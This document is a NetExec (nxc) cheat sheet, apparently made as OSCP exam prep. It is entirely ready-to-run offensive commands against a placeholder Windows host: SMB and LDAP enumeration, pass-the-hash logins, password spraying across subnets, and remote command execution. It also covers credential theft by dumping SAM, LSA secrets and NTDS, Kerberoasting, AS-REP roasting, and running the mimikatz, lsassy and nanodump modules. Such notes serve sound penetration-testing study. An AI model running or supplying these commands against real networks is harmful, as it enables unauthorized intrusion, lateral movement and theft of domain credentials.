# Net exec (nxc)

```
# SMB Enumeration
nxc smb 10.10.10.10
nxc smb 10.10.10.10 -u user -p password
nxc smb 10.10.10.10 -u user -p ''
nxc smb 10.10.10.10 -u '' -p ''

# SMB Enumeration with Domain
nxc smb 10.10.10.10 -d DOMAIN -u user -p password

# SMB Enumeration with NTLM Hash
nxc smb 10.10.10.10 -u user -H NTHASH
nxc smb 10.10.10.10 -u user -H LMHASH:NTHASH

# Enumerate Shares
nxc smb 10.10.10.10 -u user -p password --shares

# Enumerate Sessions
nxc smb 10.10.10.10 -u user -p password --sessions

# Enumerate Logged On Users
nxc smb 10.10.10.10 -u user -p password --loggedon-users

# Enumerate Local Users
nxc smb 10.10.10.10 -u user -p password --users // this is important because you can catch creds from the description column

# Enumerate Local Groups
nxc smb 10.10.10.10 -u user -p password --groups

# Enumerate Domain Users
nxc smb 10.10.10.10 -u user -p password --rid-brute

# Enumerate Password Policy
nxc smb 10.10.10.10 -u user -p password --pass-pol

# Enumerate Disks
nxc smb 10.10.10.10 -u user -p password --disks

# Enumerate Services
nxc smb 10.10.10.10 -u user -p password --services

# Enumerate Spider Shares
nxc smb 10.10.10.10 -u user -p password -M spider_plus

# Enumerate AV
nxc smb 10.10.10.10 -u user -p password --av

# Check SMB Signing
nxc smb 10.10.10.10 --gen-relay-list relay.txt

# Command Execution
nxc smb 10.10.10.10 -u user -p password -x whoami
nxc smb 10.10.10.10 -u user -p password -x ipconfig
nxc smb 10.10.10.10 -u user -p password -x hostname

# PowerShell Execution
nxc smb 10.10.10.10 -u user -p password -X '$PSVersionTable'

# Dump SAM Hashes
nxc smb 10.10.10.10 -u user -p password --sam

# Dump LSA Secrets
nxc smb 10.10.10.10 -u user -p password --lsa

# Dump NTDS
nxc smb 10.10.10.10 -u user -p password --ntds

# Enable BloodHound Collection
nxc smb 10.10.10.10 -u user -p password --bloodhound

# WinRM Authentication
nxc winrm 10.10.10.10 -u user -p password
nxc winrm 10.10.10.10 -u user -H NTHASH

# WMI Authentication
nxc wmi 10.10.10.10 -u user -p password
nxc wmi 10.10.10.10 -u user -H NTHASH

# MSSQL Authentication
nxc mssql 10.10.10.10 -u user -p password
nxc mssql 10.10.10.10 -u user -H NTHASH

# MSSQL Command Execution
nxc mssql 10.10.10.10 -u user -p password -x whoami

# RDP Authentication
nxc rdp 10.10.10.10 -u user -p password

# FTP Authentication
nxc ftp 10.10.10.10 -u user -p password

# SSH Authentication
nxc ssh 10.10.10.10 -u user -p password

# LDAP Enumeration
nxc ldap 10.10.10.10 -u user -p password

# LDAP BloodHound Collection
nxc ldap 10.10.10.10 -u user -p password --bloodhound

# Kerberoasting
nxc ldap 10.10.10.10 -u user -p password --kerberoasting

# ASREP Roasting
nxc ldap 10.10.10.10 -u user -p password --asreproast output.txt

# Password Spraying
nxc smb 10.10.10.0/24 -u users.txt -p 'Password123'
nxc smb targets.txt -u users.txt -p passwords.txt
nxc smb targets.txt -u users.txt -p passwords.txt --continue-on-success

# Spray with Hash
nxc smb 10.10.10.0/24 -u administrator -H NTHASH

# Enumerate Multiple Targets
nxc smb 10.10.10.0/24 -u user -p password
nxc smb targets.txt -u user -p password

# Check Local Admin Access
nxc smb 10.10.10.10 -u user -p password --local-auth

# SMB Module Execution
nxc smb 10.10.10.10 -u user -p password -M lsassy
nxc smb 10.10.10.10 -u user -p password -M nanodump
nxc smb 10.10.10.10 -u user -p password -M mimikatz

# Spider Shares
nxc smb 10.10.10.10 -u user -p password -M spider_plus --share SHARE

# Verbose Output
nxc smb 10.10.10.10 -u user -p password --verbose

# Save Output
nxc smb 10.10.10.10 -u user -p password > nxc.txt

# Common OSCP Commands
nxc smb 10.10.10.10
nxc smb 10.10.10.10 -u user -p password
nxc smb 10.10.10.10 -u user -H NTHASH
nxc smb 10.10.10.10 -u user -p password --shares
nxc smb 10.10.10.10 -u user -p password --users
nxc smb 10.10.10.10 -u user -p password --rid-brute
nxc smb 10.10.10.10 -u user -p password --sam
nxc smb 10.10.10.10 -u user -p password -x whoami
nxc ldap 10.10.10.10 -u user -p password --bloodhound
nxc ldap 10.10.10.10 -u user -p password --kerberoasting
```
